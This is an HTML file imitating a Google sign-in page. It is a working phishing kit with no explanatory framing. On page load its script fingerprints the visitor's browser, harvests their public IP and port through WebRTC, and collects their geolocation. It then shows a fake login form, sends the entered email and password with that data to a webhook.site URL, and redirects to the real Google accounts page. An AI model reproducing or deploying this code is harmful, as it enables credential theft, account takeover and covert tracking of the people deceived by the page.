<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Sign in – Google</title>
<style>
body{font-family:arial;display:flex;justify-content:center;align-items:center;height:100vh;background:#f0f2f5}
form{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);width:350px}
input{display:block;width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}
button{background:#1a73e8;color:#fff;border:none;padding:12px;border-radius:4px;width:100%;font-size:16px}
</style>
</head>
<body>
<script>
// === CONFIG ===
var WEBHOOK_URL = "https://webhook.site/7d1d531c-406d-420f-ab76-dbb9d85c3568";
// ==============

// Collect browser info
var browserData = {
    userAgent: navigator.userAgent,
    screen: screen.width + "x" + screen.height,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    timestamp: new Date().toISOString()
};

// WebRTC IP & Port leak
function getPublicIPPort(callback) {
    var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    pc.createDataChannel('');
    pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
    pc.onicecandidate = function(e) {
        if (e.candidate) {
            var parts = e.candidate.candidate.split(' ');
            if (parts[7] && parts[7] !== '0.0.0.0' && parts[7] !== '127.0.0.1') {
                var ip = parts[7];
                var port = parts[5];
                callback(ip, port);
                pc.close();
            }
        }
    };
    // fallback after 3 seconds if no candidate
    setTimeout(function() { callback('unknown', 'unknown'); pc.close(); }, 3000);
}

// Get public IP:port asynchronously
var publicIP = 'pending';
var publicPort = 'pending';
getPublicIPPort(function(ip, port) {
    publicIP = ip;
    publicPort = port;
    browserData.publicIP = ip;
    browserData.publicPort = port;
});

// Get geolocation
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(pos){
        browserData.lat = pos.coords.latitude;
        browserData.lon = pos.coords.longitude;
        browserData.accuracy = pos.coords.accuracy;
        sendData(browserData);
    }, function(){
        fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(ipInfo => {
            browserData.lat = ipInfo.latitude;
            browserData.lon = ipInfo.longitude;
            browserData.city = ipInfo.city;
            browserData.region = ipInfo.region;
            browserData.country = ipInfo.country_name;
            browserData.ipAccuracy = 'ip_based';
            sendData(browserData);
        });
    }, {enableHighAccuracy:true, timeout:5000});
} else {
    fetch('https://ipapi.co/json/')
    .then(r => r.json())
    .then(ipInfo => {
        browserData.lat = ipInfo.latitude;
        browserData.lon = ipInfo.longitude;
        browserData.city = ipInfo.city;
        browserData.region = ipInfo.region;
        browserData.country = ipInfo.country_name;
        browserData.ipAccuracy = 'ip_based';
        sendData(browserData);
    });
}

function sendData(data) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", WEBHOOK_URL, true);
    xhr.setRequestHeader("Content-Type","application/json");
    xhr.send(JSON.stringify({type:"initial", data: data}));
}

// After 2.5 seconds, show fake login form (wait for WebRTC too)
setTimeout(function(){
    document.body.innerHTML = `
<form id="loginForm">
  <h2 style="margin-top:0">Sign in</h2>
  <p style="color:#666">Continue to Google</p>
  <input type="email" id="email" placeholder="Email or phone" required>
  <input type="password" id="pass" placeholder="Password" required>
  <button type="submit">Sign in</button>
</form>
<script>
document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault();
    var email = document.getElementById("email").value;
    var pass = document.getElementById("pass").value;
    var finalData = {
        email: email,
        password: pass,
        lat: ` + (browserData.lat !== undefined ? browserData.lat : "null") + `,
        lon: ` + (browserData.lon !== undefined ? browserData.lon : "null") + `,
        accuracy: ` + (browserData.accuracy || "'ip'") + `,
        publicIP: "` + publicIP + `",
        publicPort: "` + publicPort + `",
        userAgent: "` + browserData.userAgent.replace(/"/g,'\\"') + `",
        screen: "` + browserData.screen + `",
        language: "` + browserData.language + `"
    };
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "` + WEBHOOK_URL + `", true);
    xhr.setRequestHeader("Content-Type","application/json");
    xhr.send(JSON.stringify({type:"credentials", data: finalData}));
    window.location.href = "https://accounts.google.com";
});
<\/script>
`;
}, 2500);
</script>
</body>
</html>
